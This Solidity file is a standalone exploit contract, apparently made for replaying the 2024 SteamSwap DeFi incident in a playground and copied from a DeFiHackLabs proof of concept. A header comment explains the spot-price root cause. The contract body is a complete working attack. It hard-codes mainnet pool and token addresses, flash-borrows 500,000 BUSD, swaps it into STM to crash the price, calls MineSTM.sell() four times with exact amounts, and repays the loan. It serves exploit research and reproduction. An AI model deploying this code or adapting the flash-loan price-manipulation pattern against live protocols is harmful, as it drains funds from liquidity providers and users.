// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-06-SteamSwap).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (`contract SteamSwap is BaseTestWithBalanceLog`; attacker ==
// address(this); the PancakeV3 flash-loan callback `pancakeV3FlashCallback`
// lives on the test itself) — there is no standalone exploit contract to
// deploy. This contract is a faithful, self-contained copy of that inline
// attack (`testExploit()` + `pancakeV3FlashCallback()`) so the playground can
// deploy it and record `run()`. Logic and constants are copied verbatim from
// test/SteamSwap_exp.sol.
//
// Root cause: MineSTM.sell() lets a holder redeem STM for BUSD/USDT by first
// pulling LP tokens out of the Cake_LP pair (via the router's
// removeLiquidity) and crediting the caller BUSD/STM at the pair's CURRENT
// (spot) reserve ratio — a ratio the caller itself just moved with an
// oversized same-block PancakeV3-flash-loan-funded swap immediately before
// calling sell(). There is no TWAP/oracle check and no minimum-output
// slippage protection on the internal removeLiquidity call, so the attacker
// swaps a huge BUSD flash loan into STM (crashing the STM/BUSD pool price),
// then calls sell() four times in the same transaction — each sell pulls LP
// out of the manipulated pool and hands back BUSD priced off the *distorted*
// reserves, draining far more BUSD than the STM sold is worth. The flash loan
// (500,000 BUSD) is repaid with a small fee (~500,050 BUSD) and the rest is
// pure profit.
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICake_LP {
    function sync() external;
}

interface IPancakeV3PoolActions {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMineSTM {
    function updateAllowance() external;
    function sell(uint256 amount) external;
}

contract SteamSwapDrain {
    address internal constant Cake_LP = 0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C;
    address internal constant PancakeV3Pool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address internal constant PancakeRouter = 0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702;
    address internal constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant STM = 0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0;
    address internal constant MineSTM = 0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6;

    /// @notice Recorded attack: sync the pair, then flash-borrow 500,000 BUSD
    ///         from the PancakeV3 pool. The borrowed BUSD funds the dump/sell
    ///         sequence inside the flash callback below.
    function run() external {
        ICake_LP(Cake_LP).sync();
        uint256 amount0 = 500_000_000_000_000_000_000_000;
        IPancakeV3PoolActions(PancakeV3Pool).flash(address(this), amount0, 0, "");
    }

    /// @notice PancakeV3 flash-loan callback. Swaps the entire borrowed BUSD
    ///         balance into STM (crashing the STM/BUSD spot price on Cake_LP),
    ///         then calls MineSTM.sell() four times — each sell removes
    ///         liquidity from Cake_LP at its CURRENT (attacker-manipulated)
    ///         reserve ratio, handing back inflated BUSD for the STM sold.
    ///         Finally repays the flash loan (principal + fee); everything
    ///         left over is profit.
    function pancakeV3FlashCallback(uint256, uint256, bytes memory) external {
        IERC20(BUSD).approve(PancakeRouter, type(uint256).max);

        uint256 balance = IERC20(BUSD).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = BUSD;
        path[1] = STM;
        IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance, 0, path, address(this), 1_717_695_757
        );
        IMineSTM(MineSTM).updateAllowance();
        IERC20(STM).approve(MineSTM, type(uint256).max);

        IMineSTM(MineSTM).sell(788_457_284_784_675_531_947_146);
        IMineSTM(MineSTM).sell(58_404_243_317_383_372_736_827);
        IMineSTM(MineSTM).sell(4_326_240_245_732_101_684_211);
        IMineSTM(MineSTM).sell(32_046_224_042_460_012_475);

        IERC20(BUSD).transfer(PancakeV3Pool, 500_050_000_000_000_000_000_000);
    }
}
